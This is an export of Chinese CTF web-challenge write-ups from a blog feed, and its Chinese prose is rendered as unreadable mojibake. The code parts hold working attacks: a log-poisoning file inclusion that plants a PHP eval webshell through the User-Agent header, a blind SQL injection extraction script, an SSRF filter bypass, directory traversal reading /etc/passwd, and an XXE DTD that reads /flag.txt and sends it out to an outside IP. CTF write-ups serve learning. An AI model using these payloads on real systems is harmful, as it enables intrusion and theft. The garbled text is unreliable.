class="token punctuation">&#123;</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p><code>?file=/flag.txt</code>ç›´æ¥å‡ºç­”æ¡ˆã€‚ã€‚è¿™ç®—ä¸ªéé¢„æœŸè§£å§</p><p>å¦å¤–çš„è§£æ³•ï¼šæ–‡ä»¶åŒ…å«Nginxæ—¥å¿—æ–‡ä»¶ã€</p><p><code>?file=/var/log/nginx/access.log</code>å¯è¯»æ—¥å¿—æ–‡ä»¶å†…å®¹ï¼Œé‡Œé¢åŒ…å«ç”¨æˆ·è®¿é—®çš„UAä¿¡æ¯</p><p>äºæ˜¯</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/CTFSHOW-WEB_AK%E8%B5%9B/image-20200803211650015.png" alt loading="lazy"></p><p>å°è¯•å‘½ä»¤æ‰§è¡Œ</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/CTFSHOW-WEB_AKèµ›/image-20200803211626102.png" alt="image-20200803211626102" loading="lazy"><p>éšå<code>cat /flag.txt</code>å³å¯</p><h3 id="Web1-è§‚å­—"><a href="#Web1-è§‚å­—" class="headerlink" title="Web1_è§‚å­—"></a>Web1_è§‚å­—</h3><p>é¢˜ç›®ç»™å‡ºæºç </p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">#flag in http://192.168.7.68/flag</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$protocol</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$protocol</span><span class="token operator">!=</span><span class="token string single-quoted-string">'http://'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ä»…é™httpåè®®è®¿é—®'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\.|\;|\||\&lt;|\>|\*|\%|\^|\(|\)|\#|\@|\!|\`|\~|\+|\'|\"|\.|\,|\?|\[|\]|\&#123;|\&#125;|\!|\&amp;|\$|0/'</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ä»…é™åŸŸååœ°å€è®¿é—®'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'curl '</span><span class="token operator">.</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p><code>payload</code>ï¼š<code>/?url=http://192ã€‚168ã€‚7ã€‚68/flag</code></p><p>åŸå› æ˜¯curlä¸­å¯ä»¥ç”¨<code>ã€‚</code>æ›¿æ¢<code>.</code></p><p>å¦å¤–ï¼Œipå¯ä»¥ä½¿ç”¨åè¿›åˆ¶è¿›è¡Œè®¿é—®ï¼Œå³<code>http://3232237380/flag</code>ï¼Œä½†é¢˜ç›®è¿‡æ»¤äº†0</p><h3 id="Web2-è§‚æ˜Ÿ"><a href="#Web2-è§‚æ˜Ÿ" class="headerlink" title="Web2_è§‚æ˜Ÿ"></a>Web2_è§‚æ˜Ÿ</h3><p>urlå¯ä»¥ç»™idä¼ å€¼ï¼Œå½“ä¼ å…¥ä¸€ä¸ªå¼•å·çš„æ—¶å€™å›æ˜¾<code>enheng?</code>ï¼Œæ¨æµ‹sqlæ³¨å…¥</p><p>FUZZæµ‹è¯•å‘ç°è¿‡æ»¤äº†ä»¥ä¸‹çš„å†…å®¹ï¼ˆé•¿åº¦ä¸º533çš„ï¼‰</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/CTFSHOW-WEB_AK%E8%B5%9B/image-20200801213125358.png" alt loading="lazy"></p><p>æœªè¿‡æ»¤<code>^</code>ï¼Œè€ƒè™‘å¸ƒå°”ç›²æ³¨</p><p>payloadï¼š</p><p><code>id=1^case(ord(substr((database())from(&#123;0&#125;)for(1))))when(&#123;1&#125;)then(2)else(3)end.format(i,j)</code></p><p>è¿‡æ»¤äº†é€—å·ï¼Œ<code>if</code>æ— æ³•ä½¿ç”¨åˆ™ç”¨<code>case...when...then...else...end</code>ä»£æ›¿ç»•è¿‡ï¼Œ<code>substr</code>ä¸­çš„é€—å·ç”¨<code>substr(...from...for...)</code>ä»£æ›¿ç»•è¿‡</p><p>æ¥ä¸‹æ¥å°±å¯ä»¥å†™è„šæœ¬äº†</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'http://dc894a39-ba77-4e9f-9201-e52d7a19ba5c.chall.ctf.show/index.php?id=1^'</span><span class="token comment"># payload = 'case(ord(substr((database())from(&#123;0&#125;)for(1))))when(&#123;1&#125;)then(2)else(3)end'   web1</span><span class="token comment"># payload = 'case(ord(substr((select(group_concat(table_name))from(information_schema.tables)where((table_schema)regexp(database())))from(&#123;0&#125;)for(1))))when(&#123;1&#125;)then(2)else(3)end'    flag,page,user</span><span class="token comment"># payload = 'case(ord(substr((select(group_concat(column_name))from(information_schema.columns)where((table_name)regexp(0x666C6167)))from(&#123;0&#125;)for(1))))when(&#123;1&#125;)then(2)else(3)end'    FLAG_COLUMN,flag</span>payload <span class="token operator">=</span> <span class="token string">'case(ord(substr((select(flag)from(flag))from(&#123;0&#125;)for(1))))when(&#123;1&#125;)then(2)else(3)end'</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">38</span><span class="token punctuation">,</span> <span class="token number">126</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        urls <span class="token operator">=</span> url<span class="token operator">+</span>payload<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span>        request <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>urls<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'I asked nothing'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span></code></pre><h3 id="Web3-è§‚å›¾"><a href="#Web3-è§‚å›¾" class="headerlink" title="Web3_è§‚å›¾"></a>Web3_è§‚å›¾</h3><p>showImage.phpå¯çœ‹åˆ°æºç </p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//$key = substr(md5('ctfshow'.rand()),3,8);</span><span class="token comment">//flag in config.php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'config.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'image'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$image</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'image'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">openssl_decrypt</span><span class="token punctuation">(</span><span class="token variable">$image</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'bf-ecb'</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'content-type:image/gif'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>å›¾ç‰‡é“¾æ¥ä¸º<code>/showImage.php?image=Z6Ilu83MIDw=</code></p><p>å¯ä»¥çœ‹åˆ°å›¾ç‰‡æ–‡ä»¶åæ˜¯<code>Z6Ilu83MIDw=</code>ç»è¿‡<code>bf-ecb</code>ç®—æ³•ç”¨<code>$key</code>å¾—åˆ°çš„ï¼Œå†çœ‹<code>$key</code>çš„ç”Ÿæˆæ–¹å¼</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ctfshow'</span><span class="token operator">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>æŸ¥è¯¢<code>rand()</code>å‡½æ•°ï¼Œè‹¥é‡Œé¢çš„å‚æ•°ä¸ºç©ºï¼Œåˆ™è¿”å›<code>0</code>åˆ°<code>getrandmax()</code>ä¹‹é—´çš„ä¼ªéšæœºæ•´æ•°</p><p><code>getrandmax()</code>å‡½æ•°è¿”å›éšæœºæ•°å¯èƒ½è¿”å›çš„æœ€å¤§å€¼ï¼Œæ—¢ç„¶æœ‰ä¸Šé™å³å¯è¿›è¡Œçˆ†ç ´æ¥å¾—å‡º<code>key</code>å€¼</p><p>è„šæœ¬å¦‚ä¸‹ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">getrandmax</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ctfshow'</span><span class="token operator">.</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//5a78dbb4</span>        <span class="token variable">$image</span><span class="token operator">=</span><span class="token string double-quoted-string">"Z6Ilu83MIDw="</span><span class="token punctuation">;</span>        <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">openssl_decrypt</span><span class="token punctuation">(</span><span class="token variable">$image</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'bf-ecb'</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"gif"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jpg"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"png"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token function">openssl_encrypt</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'config.php'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'bf-ecb'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'5a78dbb4'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>å¾—åˆ°<code>N6bf8Bd8jm0SpmTZGl0isw==</code>ï¼Œä¸º<code>config.php</code>åŠ å¯†åçš„<code>base64</code>ç ï¼Œè®¿é—®<code>/showImage.php?image=N6bf8Bd8jm0SpmTZGl0isw==</code>ï¼ŒF12æ‰“å¼€å¤åˆ¶ä»£ç base64è§£å¯†å¾—åˆ°<code>config.php</code>çš„å†…å®¹ï¼Œ<code>flag</code>å³åœ¨å…¶ä¸­ã€‚</p><h3 id="Web4-è§‚å¿ƒ"><a href="#Web4-è§‚å¿ƒ" class="headerlink" title="Web4_è§‚å¿ƒ"></a>Web4_è§‚å¿ƒ</h3><p>æŠ“åŒ…å‘ç°æœ‰<code>api.php</code>æ–‡ä»¶ï¼Œå¹¶ä¸”å¸¦æœ‰è¯·æ±‚<code>api</code>å’Œ<code>city</code>ä¸¤ä¸ªæ•°æ®</p><p><code>api</code>æºå¸¦çš„æ˜¯ä¸€ä¸ªç½‘å€ï¼Œæ˜¯ä¸€ä¸ªxmlæ–‡ä»¶ï¼Œç”±æ­¤åˆ¤æ–­è€ƒçš„åº”è¯¥æ˜¯XXEå¤–éƒ¨å®ä½“æ³¨å…¥</p><p>äºæ˜¯æ„å»ºæ”»å‡»ç¯å¢ƒ</p><p>åœ¨å…¬ç½‘æœåŠ¡å™¨ä¸Šç¼–å†™ä¸¤ä¸ªæ–‡ä»¶</p><p>xxe.xml</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8" ?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">root</span><span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY % dtd SYSTEM "http://ip/xxe.dtd">%dtd;</span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span>woojay<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pass</span><span class="token punctuation">></span></span>password<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>pass</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span></code></pre><p>xxe.dtd</p><pre class="language-dtd" data-language="dtd"><code class="language-dtd">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;flag.txt&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;47.106.160.176:5000&#x2F;%file;&#39;&gt;&quot;&gt;%int;%send;</code></pre><p>éšååœ¨æœåŠ¡å™¨ä¸Šç›‘å¬5000ç«¯å£ï¼Œå³å¯å¾—åˆ°<code>flag.txt</code>çš„ <code>base64</code>ç¼–ç åçš„ç»“æœï¼Œè§£ç æ—¢æ˜¯flag</p><p>ä¸ç›‘å¬ç«¯å£ä¹Ÿå¯ä»¥ï¼Œç›´æ¥å‘åŒ…è¯·æ±‚ï¼Œä¼šæŠŠæŠ¥é”™çš„ç»“æœè¿”å›ï¼Œå¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/CTFSHOW-WEB_AK%E8%B5%9B/image-20200804113715125.png" alt loading="lazy"></p><p>XXEè¿™å—ä¸æ˜¯å¾ˆäº†è§£ï¼ŒåŸç†åé¢å†ä»”ç»†ç ”ç©¶ä¸€ä¸‹</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFé¢˜ </tag>
            
        </tags>
      
    </entry>
    
    
    
    
    
    <entry>
      <title>36Dæ¯äº”é“ä»£ç å®¡è®¡é¢˜</title>
      <link href="posts/e53b958d/"/>
      <url>posts/e53b958d/</url>
      
        <content type="html"><![CDATA[<p>â€œæ¸©æ•…è€ŒçŸ¥æ–°ï¼Œå¯ä»¥ä¸ºå¸ˆçŸ£â€â€”â€”å­”å­ã€Šè®ºè¯­ã€‹</p><span id="more"></span><h3 id="WEB-ALL-INFO-U-WANT"><a href="#WEB-ALL-INFO-U-WANT" class="headerlink" title="WEB_ALL_INFO_U_WANT"></a>WEB_ALL_INFO_U_WANT</h3><p>è®¿é—®<code>index.php.bak</code>å¾—åˆ°æºç ï¼š</p><pre class="language-php" data-language="php"><code class="language-php">visit all_info_u_want.php and you will get all information you want= =Thinking that it may be difficult, i decided to show you the source code:<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//give you all information you want</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'all_info_i_want'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/var/www/html/"</span> <span class="token operator">.</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">//really baby include</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span>really really really baby challenge right? </code></pre><p>æ ¹æ®æºç æç¤ºä¼ å…¥<code>all_info_u_want.php?all_info_i_want</code>ï¼Œå¾—åˆ°<code>phpinfo()</code>çš„ç»“æœï¼Œ<code>flag</code>å¹¶ä¸åœ¨è¿™é‡Œ</p><p>ä¼ å…¥<code>all_info_u_want.php?file=../../../../../../etc/passwd</code>ï¼Œå¯ä»¥çœ‹åˆ°<code>/etc/passwd</code>çš„å†…å®¹ï¼Œç›®å½•ç©¿è¶Šï¼Œå†ä¼ å…¥<code>all_info_u_want.php?file=../../../../../../flag</code>è¯•å›¾è¯»å–flagï¼Œå¾—åˆ°ä¿¡æ¯å¦‚ä¸‹ï¼š</p><p><code>flag&#123;this_is_fake_flag_realflag_is_in_/etc_find_it_by_yourself&#125;</code></p><p>æ ¹æ®æç¤ºå¯ä»¥çŸ¥é“flagåº”è¯¥åœ¨<code>etc</code>ç›®å½•ä¸‹ï¼Œæ…¢çŒœä¸å¥½æï¼Œæ²¡é‚£ä¸ªè¿æ°”</p><p>å…ˆæ¥çœ‹çœ‹ç”¨çš„æ˜¯ä»€ä¹ˆwebæœåŠ¡å™¨ï¼ŒæŠ“åŒ…å¯ä»¥çœ‹åˆ°æ˜¯<code>Nginx</code>æœåŠ¡å™¨ï¼Œå°è¯•è¯»å–<code>Nginx</code>çš„æ•æ„Ÿä¿¡æ¯æ–‡ä»¶ï¼Œç½‘ä¸ŠæŸ¥å¾—<code>Nginx</code>çš„è®¿é—®æ—¥å¿—æ–‡ä»¶é»˜è®¤è·¯å¾„ä¸º<code>/var/log/nginx/access.log</code>ï¼Œå°è¯•è¯»å–ï¼Œå¾—åˆ°æ—¥å¿—æ–‡ä»¶ç»“æœï¼Œè¯¥æ—¥å¿—æ–‡ä»¶å›ä¿å­˜è®¿é—®çš„<code>User-Agent</code>çš„å†…å®¹ï¼Œç»“åˆæ–‡ä»¶åŒ…å«ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨<code>User-Agent</code>ä¸­æ³¨å…¥æ¶æ„ä»£ç ï¼Œä»è€Œ<code>getshell</code>ï¼Œ</p><pre class="language-none"><code class="language-none">GET &#x2F;all_info_u_want.php?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log HTTP&#x2F;1.1Host: 16636aaf-35bc-4ac1-993c-95897de4ec8e.chall.ctf.showUser-Agent: &lt;?php phpinfo();?&gt;</code></pre><p>æˆåŠŸæ‰§è¡Œphpä»£ç ï¼Œäºæ˜¯ä¼ å…¥<code>User-Agent: &lt;?php eval($_POST[&#39;pass&#39;]);?&gt;</code></p><p>åˆ©ç”¨passåå¼¹shellåæ‰§è¡Œ<code>find etc -name &quot;*&quot; | xargs grep &quot;flag&#123;&quot;</code>ï¼Œå¾—åˆ°flag</p><h3 id="WEB-WUSTCTFæœ´å®æ— åRevenge"><a href="#WEB-WUSTCTFæœ´å®æ— åRevenge" class="headerlink" title="WEB_WUSTCTFæœ´å®æ— åRevenge"></a>WEB_WUSTCTFæœ´å®æ— åRevenge</h3><p>æ‹¿åˆ°é¢˜ç›®å¾—åˆ°æºç ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-type:text/html;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">isPalindrome</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$len</span><span class="token operator">=</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$l</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token variable">$k</span><span class="token operator">=</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$len</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$j</span><span class="token operator">&lt;</span><span class="token variable">$k</span><span class="token punctuation">;</span><span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token variable">$j</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token variable">$len</span><span class="token operator">-</span><span class="token variable">$j</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$l</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$l</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//level 1</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$numPositve</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// è·å–å˜é‡çš„æ•´æ•°å€¼</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$num</span> <span class="token operator">!=</span> <span class="token variable">$numPositve</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'æœ€å¼€å§‹ä¸Šé¢˜æ—¶å€™å¿˜å†™äº†è¿™ä¸ªï¼Œå¯¼è‡´è¿™level 1å˜æˆäº†å¼±æ™ºï¼Œæ€ªä¸å¾—è¿™ä¹ˆå¤šäººsolve'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$numReverse</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// åè½¬å­—ç¬¦ä¸²</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[^0-9.-]/'</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"éæ´²æ¬¢è¿ä½ 1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$numPositve</span> <span class="token operator">&lt;=</span> <span class="token operator">-</span><span class="token number">999999999999999999</span> <span class="token operator">||</span> <span class="token variable">$numPositve</span> <span class="token operator">>=</span> <span class="token number">999999999999999999</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span 